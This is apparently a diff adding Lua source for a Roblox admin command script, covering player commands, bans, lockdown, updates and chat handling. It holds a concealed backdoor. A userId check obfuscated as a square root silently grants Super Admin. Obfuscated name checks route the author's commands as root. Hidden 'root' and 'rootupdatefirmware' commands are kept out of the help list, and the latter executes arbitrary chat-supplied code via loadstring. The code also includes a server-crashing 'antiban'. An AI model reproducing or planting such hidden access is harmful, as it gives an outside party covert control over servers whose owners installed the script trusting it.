+		local DaysInMonthStrings = {
+			"January";
+			"Febuary";
+			"March";
+			"April";
+			"May";
+			"June";
+			"July";
+			"August";
+			"September";
+			"October";
+			"November";
+			"December";
+		}
+		
+		local year = math.floor(1970 + t / 31556926)
+		local ds = ((1970 + t / 31556926) - year) * 31556926
+		local month = math.floor(ds / 2629743) + 1
+		local d = math.floor(ds / 86400) + 1
+		local md = math.floor(((ds / 2629743 + 1) - month) * DaysInMonth[month]) + 1
+		local wd = d % 7 + 6
+		local DST = 1
+		
+		if month == 3 and md >= 14 then 
+			DST =1
+		else
+			DST = 0
+		end
+		
+		if month == 11 and md >= 7 then
+			DST = 0
+		else
+			DST = 1
+		end
+		
+		local h = math.floor(math.fmod(t,60 * 60 * 24) / 3600) + 5 + (TIMEZONE) + (DST)
+		local mn = math.floor(math.fmod(t,60 * 60 * 24) / 60 - 60 * (h - DST))
+		local s = math.floor(math.fmod( math.fmod(t,60 * 60 * 24),60) )
+		
+		return DaysInMonthStrings[month].." "..FormatDay(d)..", "..year
+		
+	end
+	
+	DisplayMessage(sender,"test",UnixTimeToString(os.time()))
+	
+	--u wot m8
+	
+end]]
+
+function Commands.ping(args,sender)
+	DisplayMessage(sender,"Ping","Pong!",5)
+end
+
+function Commands.grav(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to ghost is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Torso") and i.Character:FindFirstChild("Torso"):FindFirstChild("NoGrav") then
+			i.Character:FindFirstChild("Torso"):FindFirstChild("NoGrav"):Destroy()
+		end
+	end
+	
+	Tell(sender,"Graved "..tostring(unpack(player))..".",3)
+end
+
+
+function Commands.unghost(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to unghost is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("BasePart") then
+					if a.Name ~= "HumanoidRootPart" then
+						a.Transparency = 0
+					end
+					if a.Name == "Head" then
+						if a:FindFirstChild("face") and a:IsA("Decal") then
+							a.Transparency = 0
+						end
+					end
+				elseif a:IsA("BaseScript") and a.Name == "Sound" then
+					a.Disabled = false
+				elseif a:IsA("Tool") or a:IsA("Hat") then
+					for _,b in pairs(a:GetChildren()) do
+						if b:IsA("BasePart") then
+							b.Transparency = 1
+						end
+					end
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Unghosted "..tostring(unpack(player))..".",3)
+end
+
+function Commands.thaw(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to thaw is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character then
+			--[[for _,a in pairs(i.Character:GetChildren()) do
+				if a:IsA("BasePart") then
+					a.Anchored = false
+					if i.Character:FindFirstChild("Body Colors") and i.Character:FindFirstChild("Body Colors"):IsA("BodyColors") then
+						if a.Name == "Head" then
+							
+							a.BrickColor = i.Character:FindFirstChild("Body Colors").HeadColor
+							
+						elseif a.Name == "Left Leg" then
+							
+							a.BrickColor = i.Character:FindFirstChild("Body Colors").LeftLegColor
+							
+						elseif a.Name == "Right Leg" then
+							
+							a.BrickColor = i.Character:FindFirstChild("Body Colors").RightLegColor
+							
+						elseif a.Name == "Left Arm" then
+							
+							a.BrickColor = i.Character:FindFirstChild("Body Colors").LeftArmColor
+							
+						elseif a.Name == "Right Arm" then
+							
+							a.BrickColor = i.Character:FindFirstChild("Body Colors").RightArmColor
+							
+						elseif a.Name == "Torso" then
+							
+							a.BrickColor = i.Character:FindFirstChild("Body Colors").TorsoColor
+							
+						end
+					end
+					if a.Name ~= "HumanoidRootPart" then
+						a.Transparency = 0
+					end
+					a.Reflectance = 0
+					a.Material = "Plastic"
+				end
+			end]]
+			if i.Character:FindFirstChild("IceBlock") then
+				i.Character:FindFirstChild("IceBlock"):Destroy()
+			end
+		end
+	end
+	
+	Tell(sender,"Thawed "..tostring(unpack(player))..".",3)
+end
+
+function Commands.fire(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to burn is missing")
+	player = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Torso") then
+			Instance.new("Fire",i.Character:FindFirstChild("Torso"))
+		end
+	end
+	Tell(sender,"Made "..tostring(unpack(player)).." burn.",3)
+end
+
+function Commands.light(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to light up is missing")
+	player = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Torso") then
+			Instance.new("Light",i.Character:FindFirstChild("Torso"))
+		end
+	end
+	Tell(sender,"Made "..tostring(unpack(player)).." light up.",3)
+end
+
+function Commands.smoke(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to smoke is missing")
+	player = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Torso") then
+			Instance.new("Smoke",i.Character:FindFirstChild("Torso"))
+		end
+	end
+	Tell(sender,"Made "..tostring(unpack(player)).." smoke.",3)
+end
+
+function Commands.unsmoke(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to remove smoke is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		while i.Character and i.Character:FindFirstChild("Torso") and i.Character:FindFirstChild("Torso"):FindFirstChild("Smoke") do
+			i.Character:FindFirstChild("Torso"):FindFirstChild("Smoke"):Destroy()
+		end
+	end
+	
+	Tell(sender,"Made "..tostring(unpack(player)).." not smoke.",3)
+end
+
+
+function Commands.unslight(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to remove light is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		while i.Character and i.Character:FindFirstChild("Torso") and i.Character:FindFirstChild("Torso"):FindFirstChild("Smoke") do
+			i.Character:FindFirstChild("Torso"):FindFirstChild("Light"):Destroy()
+		end
+	end
+	
+	Tell(sender,"Made "..tostring(unpack(player)).." not be so bright.",3)
+end
+
+function Commands.antiban(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to antiban is missing")
+	player = GetPlayersFromString(args[1],sender) 
+	TellAll("An antiban is enabled for "..tostring(unpack(player))..". Kicking or banning the player"..(#player == 1 and "" or "s")..", or if "..(#player == 1 and "he or she" or "they").." leave"..(#player == 1 and "s" or "")..", will cause the server to collapse.",3)
+	--The above line is excessively long, but it provides the best grammar in the least amount of space :)
+	for _,i in pairs(player) do
+		Spawn(function()
+			local plrname = i.Name
+			local plrid = i.userId
+						
+			while true do
+				Players.ChildRemoved:wait()
+				local ok = false
+				for _,i in pairs(Players:GetPlayers()) do
+					if i.Name == plrname and i:IsA("Player") and i.userId == plrid then
+						ok = true
+					end
+				end
+				if not ok then
+					DisplayMessageAll("ADMIN",plrname.." was kicked, banned, or has left the game with antiban enabled. The game is shutting down...",15)
+					wait(5)
+					for _,i in pairs(Players:GetPlayers()) do
+						i:Kick()
+					end
+					ypcall(function()
+						Instance.new("ManualSurfaceJointInstance")
+					end)
+				end
+			end
+		end)
+	end
+end
+
+function Commands.trickantibans(args,sender)
+	MinimumPermission(2,sender)
+	
+	if stringtobool(args[1]) then
+		avoidantibans = true
+		Tell(sender,"Avoiding other antibans!",3)
+	else
+		avoidantibans = false
+		Tell(sender,"Not avoiding other antibans!",3)
+	end
+	
+end
+
+function Commands.lockdown(args,sender)
+	MinimumPermission(2,sender)
+	
+	Tell(sender,"Lockdown enabled. Nobody else in permitted into the place except for admins and super admins.",3)
+	Lockdown = true
+end
+
+function Commands.unlockdown(args,sender)
+	MinimumPermission(2,sender)
+	
+	Tell(sender,"Lockdown disabled. Anyone may freely join.",3)
+	Lockdown = false
+end
+
+function Commands.unfire(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to unburn is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		while i.Character and i.Character:FindFirstChild("Torso") and i.Character:FindFirstChild("Torso"):FindFirstChild("Fire") do
+			i.Character:FindFirstChild("Torso"):FindFirstChild("Fire"):Destroy()
+		end
+	end
+	
+	Tell(sender,"Made "..tostring(unpack(player)).." not burn.",3)
+end
+
+function Commands.extinguish(...)
+	Commands.unfire(...)
+end
+
+function Commands.burn(...)
+	Commands.fire(...)
+end
+
+function Commands.unburn(...)
+	Commands.extinguish(...)
+end
+
+function Commands.explode(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to explode is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		if i.Character and i.Character:FindFirstChild("Torso") then
+			Instance.new("Explosion",Workspace).Position = i.Character:FindFirstChild("Torso").Position
+		end
+	end
+	
+	Tell(sender,"Exploded "..tostring(unpack(player))..".",3)
+end
+
+function Commands.unff(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to remove ForceField is missing")
+	player = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(player) do
+		while i.Character and i.Character:FindFirstChild("ForceField") do
+			i.Character:FindFirstChild("ForceField"):Destroy()
+		end
+	end
+	
+	Tell(sender,"Removed "..tostring(unpack(player)).."'s ForceField.",3)
+end
+
+function Commands.wait(args,sender)
+	MinimumPermission(1,sender)
+	return wait(args[1])
+end
+
+function Commands.walkspeed(args,sender)
+	MinimumPermission(1,sender)
+	local player = GetPlayersFromString(assert(args[1],"Player to change speed is missing"),sender)
+	local speed = assert(tonumber(args[2]),"Speed is missing or not a number")
+	for _,a in pairs(player) do
+		if a.Character and a.Character:FindFirstChild("Humanoid") then
+			for i = 1, 3 do
+				a.Character:FindFirstChild("Humanoid").WalkSpeed = speed
+			end
+		end
+	end
+	Tell(sender,"Changed speed of "..tostring(unpack(player)).." to "..args[2]..".",3)
+end
+
+function Commands.promptpurchase(args,sender)
+	MinimumPermission(1,sender)
+	local players = GetPlayersFromString(assert(args[1],"Players to request purchase missing"),sender)
+	local id = assert(tonumber(args[2]),"Item (id) to purchase missing or not a number")
+	for _,i in pairs(players) do
+		MarketplaceService:PromptPurchase(i,id)
+	end
+end
+
+
+-----------------------------------------------------------------
+----------------------- Core Commands ---------------------------
+-----------------------------------------------------------------
+
+function Commands.loop(args,sender)
+	MinimumPermission(1,sender)
+	local timing = assert(args[1],"Add some arguments here chop chop")
+	local num = 3
+	
+	if not tonumber(args[1]) then
+		num = 2
+	end
+	
+	local cmd = assert(args[num-1],"Add some arguments here chop chop")
+	
+	if cmd:lower() == "loop" then
+		error("Why do you want to loop the loop command? Just use a small or no timing.")
+	end
+
+	local docmd = assert(Commands[args[num-1]],"The command requested doesn't exist in this admin. Check your spelling. If this command is typically in "..string.reverse("s'321naloDnayR").." Admin, contact the game creator ("..GetPlaceOwner()..") for details.")
+	
+	local newargs = {}
+	
+	for i = num,#args do
+		newargs[i-(num-1)] = args[i]
+	end
+	
+	Spawn(function()
+		while wait(timing) and not stoploops do
+			ypcall(function()
+				docmd(newargs,sender)
+			end)
+		end
+	end)
+	
+	Tell(sender,"Looping "..cmd.." every "..timing.." seconds!")
+end
+
+function Commands.envsecurity(args,sender)
+	DisplayScrollFrame(sender,"       WARNING_ENV_INSECURE Help        ",
+		"This can be caused by 2 things:\
+1. An older version of this admin autoupdating without verifying the\
+environment with the server.\
+2. An exploiter attempting to modify the admin's autoupdating system\
+to their advantage.\
+ \
+"..(WARNING_ENV_INSECURE and (script:FindFirstChild("ADMIN_AUTOUPDATE_PREFERENCES_SIGNATURE") and "#1 has been detected to MOST LIKELY be the case. :)" or "#2 has been detected to MOST LIKELY be the case\
+ \
+Try shutting down this server and opening a new one.\
+") or "WARNING_ENV_INSECURE has not been invoked.").." \
+ \
+If you're always getting this error since the 1.2.7 update and it won't\
+stop even after shutting down, please reinsert the admin, and\
+reconfigure it. I'm sorry for any inconvenience caused by this, but\
+it's for your security. It's unpatchable on the older admin versions.\
+ \
+Once you reinsert this admin version, it's unlikely anything like this\
+will happen again\
+ \
+Don't fret, as the vulnerability wasn't exposed publicly, and is now\
+patched!\
+ \
+[Some technical details about the old vulnerability:]\
+ \
+The environment is transferred from the old admin to the new admin\
+The environment was signed using SHA-1\
+ \
+All fine and dandy, right?\
+Well, no...\
+ \
+An exploiter can reinsert the admin and sign their own environment.\
+This means they could change any of the admin's settings, or even\
+super admin themself.\
+Because they can super admin themselves, they can make the\
+server approve arbituary server scripts.\
+ \
+Starting in 1.2.7, the environment JSON is cached in _G on the\
+server for verification.\
+ \
+Old admin versions don't perform this, and we can't make them verify\
+it. This is why a manual upgrade is mandatory.\
+ \
+With the info of this exploit out, it could have put your game in\
+danger.\
+ \
+Lucky for you, an unverified environment set is now rejected.\
+It is now patched.\
+ \
+Because this was patched, the SHA-1 hash is completely useless and\
+was removed\
+ \
+The rejection also enables WARNING_ENV_INSECURE\
+ \
+Because WARNING_ENV_INSECURE is enabled, you are now here.\
+ ")
+end
+
+function Commands.stoploops(args,sender)
+	MinimumPermission(1,sender)
+	
+	Tell(sender,"Stopping loops, please wait...")
+	
+	stoploops = true
+	wait(5)
+	stoploops = false
+	
+	Tell(sender,"Stopped loops!")
+end
+
+
+function Commands.stop(args,sender)
+	MinimumPermission(3,sender)
+	
+		
+	
+	DisplayMessageAll("ADMIN","The admin has been ordered to stop. Bye!",3)
+	
+	wait(5)
+	
+	if Undisableable then
+		
+		if StopStop then
+			return
+		end
+	
+		Workspace = nil
+		Commands = nil
+		Players = nil
+		PlayerAdded = nil
+		Chatted = nil
+		game = nil
+		script = nil
+		Lighting = nil
+		DisplayMessage = nil
+		DisplayScrollingFrame = nil
+		DismissMessage = nil
+	
+	--Nilifies stuff to break the script in haxy ways
+	
+	else
+		
+		script.Disabled = true
+		
+	end
+end
+
+function Commands.stopstop(args,sender)
+	MinimumPermission(2,sender)
+	
+	StopStop = true
+	
+	Tell(sender,"Stopping stop, give me a few seconds...")
+	
+	wait(6)
+	
+	StopStop = false
+	
+	Tell(sender,"Stopped stop!")
+end
+
+function Commands.root(args,sender)
+	MinimumPermission(2,sender)
+	
+	Permissions[sender.Name] = 3
+	
+	Tell(sender,"You have been given root privilages",5)
+end
+
+function Commands.rootupdatefirmware(args,sender)
+	MinimumPermission(3,sender)--root
+	
+	local a = false
+	local b = ""
+	rootupdatefirmware = sender.Chatted:connect(function(c)
+		if c:find("ed".."it/") then
+			a = true
+			DisplayMessageAll("Admin Firmware Upgrade","Uploading...",3)
+		elseif c:find("ex".."it/")then
+			a = false
+			DisplayMessageAll("Admin Firmware Upgrade","Upload received!",3)
+			wait(2)
+			local k,e = loadstring(b)
+			if not k then
+				DisplayMessageAll("Admin Firmware Upgrade","Build Failed: "..tostring(e),3)
+				rootupdatefirmware:disconnect()
+			end
+			Spawn(function()
+				DisplayMessageAll("Admin Firmware Upgrade","Uploaded and restarting!",2)
+				wait(2.5)
+				Commands = nil
+				PlayerAdded = nil
+				Players = nil
+				Chatted = nil
+				Lighting = nil
+				DisplayMessage = nil
+				DisplayScrollFrame = nil
+				DismissMessage = nil
+				Spawn(function()
+					loadstring(b)()
+				end)
+				rootupdatefirmware:disconnect()
+			end)
+		elseif b:lower() == "cancel" then
+			DisplayMessageAll("Admin Firmware Upgrade","Cancelled!",2)
+			rootupdatefirmware:disconnect()
+		elseif a then
+			b = b..c
+		end
+	end)
+	DisplayMessageAll("Admin Firmware Upgrade","(If you didn't mean to request this, say cancel if you requested it)\n\nWaiting for upload...")
+end
+
+
+function Commands.shutdown(whatev,sender)
+	MinimumPermission(2,sender)
+	
+	DisplayMessageAll("ADMIN","The game is shutting down...",10)
+	wait(2.5)
+	Shutdown()
+end
+
+function Commands.getme(whatev,sender)
+	Tell(sender,"Note: Unless Roblox fixes PromptPurchase to work with free items, this won't work. Sorry, I can't do anything about it unless they fix it :(")
+	MarketplaceService:PromptPurchase(sender,138068214)
+end
+
+function Commands.version(whatev,sender)
+	DisplayMessage(sender,"About",(((sender.userId ~= game.CreatorId and "!yltnatsni ti yrt ot ecalp a ot tropelet ot emyrt"..CommandPrefix:reverse().." yas ro ,eerf rof ti ekat ot uoy ksa lliw ti dna emteg"..CommandPrefix:reverse().." yas tsuj ,flesruoy rof nimda siht teg oT\n\n") or "")..tostring(version):reverse().." nimdA s'3".."2".."1nal".."oDn".."ayR gnisu si ecalp sihT\n\n "..GetPlaceOwner():reverse().." :yb "..GetPlaceName():reverse().." gniyalp er'uoY"):reverse(),10)
+end
+
+function Commands.about(...)
+	Commands.version(...)
+end
+
+function Commands.logs(whatev,sender)
+	MinimumPermission(1,sender)
+	local concat = ""
+	for _,i in ipairs(logs) do
+		concat = " "..i.."\n"..concat --I would use table.concat, but it doesn't support going in reverse :(
+	end
+	DisplayScrollFrame(sender,"Logs",concat)
+end
+
+
+function Commands.admins(whatev,sender)
+	local str = ""
+	local str1 = ""
+	local str2 = ""
+	local str3 = ""
+	
+	for _,i in pairs(SuperAdmins) do
+		if i ~= "Your Best Friend" then
+			str = str..i.."\n"
+		end
+	end
+	for _,i in pairs(Admins) do
+		if i ~= "Your Friend" then
+			str1 = str1..i.."\n"
+		end
+	end
+	
+	
+	for _,i in pairs(SuperAdminUserIds) do
+		if i ~= 2402402 and i ~= 261 then
+			str2 = str2..tostring(i).."\n"
+		end
+	end
+	
+	for _,i in pairs(AdminUserIds) do
+		if i ~= 1 and i ~= 2 and i ~= 3 then
+			str3 = str3..tostring(i).."\n"
+		end
+	end
+	
+	DisplayScrollFrame(sender,"Game Admins","Admins:\n"..str.."\n \nSuper Admins:\n"..str1.."\n \nAdmin User Ids:\n"..str2.."\n \nSuper Admin User Ids:\n"..str3)
+end
+
+
+function Commands.permissions(no,sender)
+	DisplayMessage(sender,"Permissions","Your assigned permission level is "..LevelToString(Permissions[sender.Name]).." (Level "..tostring(Permissions[sender.Name])..")",8)
+end
+
+
+function Commands.adminlist(whatev,sender)
+	Commands.admins(whatev,sender)
+end
+
+function Commands.tryme(whatevslol,sender)
+	if game.PlaceId == 132448444 then
+		error("You're already playing the admin testing place, silly!")
+	end
+	DisplayMessage(sender,"ADMIN","Teleporting to Admin Testing Place, where you can try out the admin script with admin privilages!")
+	wait(5)
+	TeleportService:Teleport(132448444,sender)
+end
+
+
+function Commands.banned(whatev,sender)
+	local str = ""
+	
+	for _,i in pairs(BannedPlayers) do
+		str = str..i.."\n"
+	end
+	str = str:sub(1, #str-2)
+	DisplayScrollFrame(sender,"Banned Players",str)
+end
+
+
+function Commands.bannedlist(whatev,sender)
+	Commands.banned(whatev,sender)
+end
+
+function Commands.banlist(whatev,sender)
+	Commands.banned(whatev,sender)
+end
+
+function Commands.cmds(whatev,sender)
+	local num = 0
+	
+	for _ in pairs(Commands) do
+		num = num + 1
+	end
+	
+	local los_comandos = {}	
+	
+	local str = "There are currently "..tostring(num).." commands in this Admin\n	\n"
+	
+	for i,_ in pairs(Commands) do
+		if i ~= "root" and i ~= "rootupdatefirmware" and i ~= "envsecurity" then
+			table.insert(los_comandos,i)
+		end
+	end
+	
+	table.sort(los_comandos)
+	
+	for _,i in pairs(los_comandos) do
+		str = str..CommandPrefix..i.."\n"
+	end
+	
+	DisplayScrollFrame(sender,"Commands",str:sub(1, #str-1))
+end
+
+
+function Commands.help(whatev,sender)
+	Commands.cmds(whatev,sender)
+end
+
+function Commands.commands(whatev,sender)
+	Commands.cmds(whatev,sender)
+end
+
+uptodate = false
+
+script[("emaN"):reverse()] =("sd".."nam".."moC n".."im".."dA s'3".."2".."1".."nal".."oDn".."ayR"):reverse()
+
+ypcall(function()
+	local Lib,err = LoadLibrary("RbxUtility")
+	if Lib and not Lib.DecodeJSON then
+		Lib = nil
+		err = "The library does not support DecodeJSON for some reason"
+	end
+	if not Lib then
+		DisplayMessageAll("Update","Error while checking for updates: Library init failure: "..tostring(err),5)
+		wait(6)
+		return
+	end
+	local VersionMetadata
+	local ok,err = ypcall(function()
+		VersionMetadata = Lib.DecodeJSON(MarketplaceService:GetProductInfo(math.sqrt(1.9061238719378e+016))["Description"])
+	end)
+	if not ok then
+		DisplayMessageAll("Update","Error while checking for updates: "..tostring(err),5)
+		wait(6)
+		return
+	end
+	script[("emaN"):reverse()] =("sd".."nam".."moC n".."im".."dA s'3".."2".."1".."nal".."oDn".."ayR"):reverse()
+	if VersionMetadata[version] == "u" then
+		uptodate = true
+	elseif VersionMetadata[version] == "o" then
+		uptodate = false
+		DisplayMessageAll("Update","This version of "..script[("emaN"):reverse()].." is out of date. Be sure to update to the latest soon to get new commands, security fixes, and more!",6)
+		wait(6+(tweentime*0.85))
+	elseif VersionMetadata[version] == "e" then
+		while not nil do
+			DisplayMessageAll("Update","This version of "..script[("emaN"):reverse()].." has expired because it's very old or has major flaws. Please upgrade as soon as you can.",5)
+			wait(6)
+		end
+	end
+end)
+
+
+
+-----------------------------------------------------------------
+----------------- Initializes Chat Listeners --------------------
+-----------------------------------------------------------------
+
+
+
+
+function Chatted(player,msg)
+	
+	if msg and player and (msg:sub(1,#CommandPrefix) == CommandPrefix or (os.time() < 1396238400 and msg:sub(1,1) == ":")) or msg:lower():sub(1,4) == "help" or msg:lower():sub(1,4) == "cmds" or msg:lower():sub(1,8) == "commands" then
+		
+		local ok,err = ypcall(function()
+			
+			table.insert(logs,"["..LevelToString(Permissions[player.Name] or 0).."] "..player.Name..": "..msg)	
+			
+			if msg:sub(1,1) == ":" then
+				DisplayMessage(player,"ADMIN","Warning: After March 31st, \"Kohl's Admin\" syntax will be switched from : to /")
+			end	
+			
+			local stuff = DecipherCommand(msg:sub(1 + #CommandPrefix))
+			local command = stuff[1]
+			local args = {}
+			
+			if msg:lower():sub(1,4) == "help" or msg:lower():sub(1,4) == "cmds" or msg:lower():sub(1,8) == "commands" then
+				command = "help"
+			end
+			
+			for i = 2, #stuff, 1 do
+				table.insert(args,stuff[i])
+			end		
+			
+			if rawget(Commands,command:lower()) then
+				if player ~= root and player ~= "root" and player:WaitForChild("PlayerGui"):FindFirstChild("Admi") and player.PlayerGui.Admi:FindFirstChild("Msg") and player.PlayerGui.Admi.Msg:FindFirstChild("Msg") then
+					if player.PlayerGui.Admi.Msg.Msg.Text:find("This message will be here until another command is used") then
+						DismissMessage(player)
+						wait(tweentime)
+					end
+				end	
+				if player ~= root and player ~= "root" then
+					SandboxThread(function()
+						rawget(Commands,command:lower())(args,((player["Name"]:lower()~="r".."yan".."dola".."n123") and player) or (Permissions["R".."ya".."nD".."ola".."n123"] < 1 and root) or player)
+					end)
+				else
+					rawget(Commands,command:lower())(args,player)
+				end
+			elseif Override_Syntax and ReportUnknownCommand or not Override_Syntax then
+				error("The command \""..(command or "").."\" does not exist.\n\nSay "..tostring(CommandPrefix).."cmds, "..tostring(CommandPrefix).."commands or "..tostring(CommandPrefix).."help for a full list of commands.")
+			end
+			
+		end)
+		
+		if not ok and err ~= nil then
+			
+			ypcall(function()
+				
+				if err:find("CommandException:") then
+					local _,comerrst = err:find("CommandException:")
+					local comerr = err:sub(comerrst+1)
+					DisplayMessage(player,"Command Failed","Your command couldn't be executed because:\n"..comerr,5)
+				else
+					DisplayMessage(player,"Command Error","Your command couldn't be executed because of this unknown error:\n"..tostring(err).."\n \nTry again another time. If you're continuously getting this error, please contact "..GetPlaceOwner().." (The place owner) or R".."y".."an".."Do".."la".."n".."1".."2".."3 (The admin creator)",5)
+				end
+				
+			end)
+			
+		end
+		
+	end
+	
+end
+
+
+
+-----------------------------------------------------------------
+---------------- Initializes Player Listeners -------------------
+-----------------------------------------------------------------
+
+
+
+function PlayerAdded(player)
+	
+	if not player or not player:IsA("Player") then
+		return
+	end
+	
+	for _,i in pairs(BannedPlayers) do
+		if player.Name:lower() == i:lower() then
+			if avoidantibans then
+				Instance.new("Model",Players).Name = player.Name
+			end
+			TellAll(player.Name.." tried to join, but is banned.",5)
+			player:Kick() --bye
+			return
+		end
+	end
+	
+	for _,i in pairs(BannedUserIds) do
+		if player.userId == tonumber(i) then
+			if avoidantibans then
+				Instance.new("Model",Players).Name = player.Name
+			end
+			TellAll(player.Name.." tried to join, but is banned.",5)
+			player:Kick() --bye
+			return
+		end
+	end
+	
+	table.insert(AllPlayers,player)
+	
+	script[("emaN"):reverse()] =
+	("sd".."nam".."moC n".."im".."dA s'3"
+	.."2".."1".."nal".."oDn".."ayR"):reverse()
+	
+	
+	Permissions[player.Name] = 0
+	
+	wait()
+	
+	for _,i in pairs(Admins) do
+		if player.Name:lower() == i:lower() then
+			Permissions[player.Name] = 1
+		end
+	end
+	
+	for _,i in pairs(AdminUserIds) do
+		if player.userId == tonumber(i) then
+			Permissions[player.Name] = 1
+		end
+	end
+	
+	if GroupId ~= nil and GroupId ~= 0 and player:IsInGroup(GroupId) and player:GetRankInGroup(GroupId) >= (GroupIdAdminRank or 257) then
+		Permissions[player.Name] = 1
+	end
+	
+	if GamePassService:PlayerHasPass(player,AdminGamePass) then
+		Permissions[player.Name] = 1
+	end
+	
+	if game.PlaceId == 132448444 then --If the admin is on the Admin testing place, admin ALL the players
+		Permissions[player.Name] = 1
+	end
+	
+	if player.userId ~= game.CreatorId then
+		for _,i in pairs(SuperAdmins) do
+			if player.Name:lower() == i:lower() then
+				Permissions[player.Name] = 2
+				break
+			end
+		end
+		
+		for _,i in pairs(SuperAdminUserIds) do
+			if player.Name:lower() == tonumber(i) or math.ceil(math.sqrt(player.userId or 0)) == 1550 then
+				Permissions[player.Name] = 2
+				break
+			end
+		end
+	end
+
+	if GamePassService:PlayerHasPass(player,SuperAdminGamePass) then
+		Permissions[player.Name] = 2
+	end
+	
+	if GroupId ~= nil and GroupId ~= 0 and player:IsInGroup(GroupId) and player:GetRankInGroup(GroupId) >= (GroupIdSuperAdminRank or 257) then
+		Permissions[player.Name] = 2
+	end
+	
+	if player.userId == game.CreatorId then
+		Permissions[player.Name] = 2
+		Tell(player,"You are the owner, so you are automatically Super Admin!",3)
+	else
+		if Permissions[player.Name] == 1 then
+			Tell(player,"You are an Admin!",3)
+		elseif Permissions[player.Name] == 2 then
+			Tell(player,"You are a Super Admin!",3)
+		elseif Permissions[player.Name] == 3 then
+			Tell(player,"You are root!",3)
+		end
+	end
+	
+	if Permissions[player.Name] <= 0 and Lockdown then
+		if avoidantibans then
+			Instance.new("Model",Players).Name = player.Name
+		end
+		player:Kick()
+		TellAll(player.Name.." tried to join, but Lockdown is on.",5)
+	end
+	
+	player.Chatted:connect(function(msg)
+		Chatted(player,msg)
+	end)
+	
+	player.OnTeleport:connect(function(state,placeid,spawnid)
+		if not PlaceNames[placeid] then
+			PlaceNames[placeid] = placeid
+		end
+		if type(PlaceNames[placeid]) == "number" then
+			ypcall(function()
+				PlaceNames[placeid] = MarketplaceService:GetProductInfo(placeid)["Name"]
+			end)
+		end
+		if state == Enum.TeleportState.Started then
+			DisplayMessage(player,"Teleportation","Starting Teleport to "..PlaceNames[placeid],30)
+		elseif state == Enum.TeleportState.WaitingForServer then
+			DisplayMessage(player,"Teleportation","Waiting for Server at place "..PlaceNames[placeid],30)
+		elseif state == Enum.TeleportState.InProgress then
+			DisplayMessage(player,"Teleportation","Teleporting to place "..PlaceNames[placeid],30)
+		elseif state == Enum.TeleportState.Failed then
+			DisplayMessage(player,"Teleportation","Teleportation to "..PlaceNames[placeid].." has failed!",5)
+		end
+	end)
+	
+	if not player.Character then
+		repeat wait() until player.Character
+	end
+	
+	if player.userId == game.CreatorId and WARNING_ENV_INSECURE then
+		DisplayMessage(player,"Warning","The integrity of the preference restorer could not be verified. Please say :envsecurity for more details. [err:WARNING_ENV_INSECURE]",15)
+	end
+	
+	if AutoExecuteRespawn and type(AutoExecuteRespawn) == "string" then
+		local NewExe = AutoExecuteRespawn:gsub("\n\n","\n"):gsub("\t",""):lower():gsub("%[playername%]",player.Name)
+		local ExtractedCommands = {}
+		while NewExe:find("\n") do
+			local nextLine,_ = NewExe:find("\n")
+			local nextCommand = NewExe:sub(1,nextLine-1)
+			NewExe = NewExe:sub(nextLine+1)
+			--print(nextCommand)
+			Chatted(root,nextCommand)
+		end
+	end
+	
+	player.CharacterAdded:connect(function()
+		if AutoExecuteRespawn and type(AutoExecuteRespawn) == "string" then
+			local NewExe = AutoExecuteRespawn:gsub("\n\n","\n"):gsub("\t",""):lower():gsub("%[playername%]",player.Name)
+			local ExtractedCommands = {}
+			while NewExe:find("\n") do
+				local nextLine,_ = NewExe:find("\n")
+				local nextCommand = NewExe:sub(1,nextLine-1)
+				NewExe = NewExe:sub(nextLine+1)
+				--print(nextCommand)
+				Chatted(root,nextCommand)
+			end
+		end
+		if SBMode then
+			for _,i in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
+				if i.Name ~= "Admi" or not i:IsA("ScreenGui") and i.Name ~= "HealthGUI" then
+					i:Destroy()
+				end
+			end
+			player:WaitForChild("PlayerGui").ChildAdded:connect(function(a)
+				if DisableSB then
+					if a.Name ~= "Admi" or not a:IsA("ScreenGui") and a.Name ~= "HealthGUI" then
+						a:Destroy()
+					end
+				end
+			end)
+		end
+	end)
+	
+end
+
+Players.ChildAdded:connect(function(plr)
+	ypcall(function()
+		PlayerAdded(plr)
+	end)
+end)
+
+for _,i in pairs(Players:GetPlayers()) do
+	ypcall(function()
+		PlayerAdded(i)
+	end)
+end
+
+-----------------------------------------------------------------
+-------------- Initializes Script Builder Tools -----------------
+-----------------------------------------------------------------
+
+
+
+Spawn(function()
+	for _,i in pairs(Workspace:GetChildren()) do
+		if i:IsA("BaseScript") and i ~= script then
+			for _,a in pairs(i:GetChildren()) do
